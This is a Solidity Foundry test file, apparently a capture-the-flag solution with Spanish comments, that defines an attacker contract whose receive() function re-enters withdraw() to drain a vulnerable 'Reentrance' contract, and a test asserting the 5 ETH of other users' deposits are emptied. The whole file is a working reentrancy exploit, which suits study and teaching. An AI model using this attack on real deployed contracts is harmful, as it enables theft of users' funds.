// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Reentrance.sol";

// Contrato atacante: su receive() vuelve a llamar withdraw() en bucle
contract Attacker {
    Reentrance public target;
    uint256 public amount;

    constructor(Reentrance _target) {
        target = _target;
    }

    function attack() external payable {
        amount = msg.value;
        // 1. Depositamos para tener saldo registrado
        target.donate{value: amount}(address(this));
        // 2. Disparamos el primer retiro, que detonará la reentrada
        target.withdraw(amount);
    }

    // Esta funcion se ejecuta CADA vez que el target nos envia ETH
    receive() external payable {
        // Mientras el target tenga fondos, seguimos re-entrando
        if (address(target).balance >= amount) {
            target.withdraw(amount);
        }
    }
}

contract ReentranceExploit is Test {
    Reentrance public target;
    Attacker public attacker;

    function setUp() public {
        target = new Reentrance();
        // Simulamos que otros usuarios ya depositaron 5 ETH en el contrato
        vm.deal(address(this), 5 ether);
        target.donate{value: 5 ether}(address(0xABCD));
    }

    function test_DrainViaReentrancy() public {
        // El contrato arranca con 5 ETH de otros usuarios
        assertEq(address(target).balance, 5 ether, "el target deberia tener 5 ETH");

        // El atacante ataca con apenas 1 ETH propio
        attacker = new Attacker(target);
        vm.deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}();

        // Resultado: el contrato quedó vaciado pese a que el atacante solo puso 1 ETH
        assertEq(address(target).balance, 0, "el target deberia quedar vacio");
        assertGt(address(attacker).balance, 1 ether, "el atacante saco mas de lo que puso");

        console.log("Balance final del atacante:", address(attacker).balance);
        console.log("Exploit exitoso: reentrancy vacio el contrato");
    }
}
